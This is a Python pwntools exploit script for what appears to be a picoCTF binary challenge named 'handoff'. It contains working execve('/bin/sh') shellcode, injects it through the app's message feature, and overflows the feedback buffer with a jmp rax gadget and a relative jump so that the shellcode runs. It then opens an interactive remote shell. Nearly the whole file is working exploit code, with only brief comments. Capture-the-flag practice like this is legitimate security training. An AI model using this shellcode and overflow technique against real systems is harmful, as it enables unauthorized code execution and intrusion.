#!/usr/bin/env python3

from pwn import *

exe = ELF("./handoff")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("shape-facility.picoctf.net", 51397)

    return r


def add_recipient(name: bytes):
    r.sendlineafter(b"Exit the app", b"1")
    r.sendlineafter(b"name: ", name)


def add_msg(index: int, msg: bytes):
    r.sendlineafter(b"Exit the app", b"2")
    r.sendlineafter(b"message to?", str(index).encode())
    r.sendlineafter(b"send them?", msg)


def exit_with_feedback(feedback: bytes):
    r.sendlineafter(b"Exit the app", b"3")
    r.sendlineafter(b"appreciate it:", feedback)


def main():
    r = conn()

    jmp_rax = 0x40116c

    shellcode = asm("""
        /* set $rdi to bin_sh's address */
        mov rdi, 0x0068732f6e69622f
        push rdi
        mov rdi, rsp

        /* call execve('/bin/sh', NULL, NULL) */
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall

        /* call exit(0) */
        xor rdi, rdi
        mov al, 0x3c
        syscall
    """)
    log.info(f"Shellcode length: {len(shellcode)}")

    # Inject shellcode
    add_recipient(b"\x90" * 0x8)
    add_msg(0, shellcode)

    # $rax still contains the address of "feedback", so we can jump
    # to our injected jmp instruction to jump to our shellcode
    exit_with_feedback(asm("jmp $-0x2d4").ljust(0x14, b'A') + p64(jmp_rax))

    r.interactive("$ ")


if __name__ == "__main__":
    main()
